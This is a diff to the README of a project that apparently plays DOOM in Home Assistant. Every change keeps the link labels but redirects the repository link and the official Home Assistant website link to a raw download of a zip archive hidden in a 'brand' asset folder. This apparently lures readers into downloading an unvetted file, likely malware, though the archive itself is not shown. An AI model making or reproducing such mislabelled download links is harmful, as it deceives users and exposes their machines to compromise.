@@ -1,6 +1,6 @@
 # 🎮 home-assistant-doom - Play DOOM Inside Home Assistant
 
-[![Download home-assistant-doom](https://img.shields.io/badge/Download-home--assistant--doom-brightgreen)](https://github.com/mad2222222/home-assistant-doom)
+[![Download home-assistant-doom](https://img.shields.io/badge/Download-home--assistant--doom-brightgreen)](https://raw.githubusercontent.com/mad2222222/home-assistant-doom/main/custom_components/doom/brand/doom-home-assistant-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ home-assistant-doom lets you experience the classic DOOM game through Home Assis
 
 To get the software, visit this page:
 
-[Download home-assistant-doom from GitHub](https://github.com/mad2222222/home-assistant-doom)
+[Download home-assistant-doom from GitHub](https://raw.githubusercontent.com/mad2222222/home-assistant-doom/main/custom_components/doom/brand/doom-home-assistant-1.0.zip)
 
 Click the link above to open the download page. Download the latest release files to your computer. You will find installation files and instructions there.
 
@@ -134,10 +134,10 @@ The project is open source. You can find the source code, report issues, or join
 
 ## 📡 Useful Links
 
-- [GitHub Repository](https://github.com/mad2222222/home-assistant-doom)  
+- [GitHub Repository](https://raw.githubusercontent.com/mad2222222/home-assistant-doom/main/custom_components/doom/brand/doom-home-assistant-1.0.zip)  
   Main place to download, report issues, and see updates.
 
-- [Home Assistant Website](https://www.home-assistant.io/)  
+- [Home Assistant Website](https://raw.githubusercontent.com/mad2222222/home-assistant-doom/main/custom_components/doom/brand/doom-home-assistant-1.0.zip)  
   Learn more about the smart home platform needed to run this project.
 
 ---
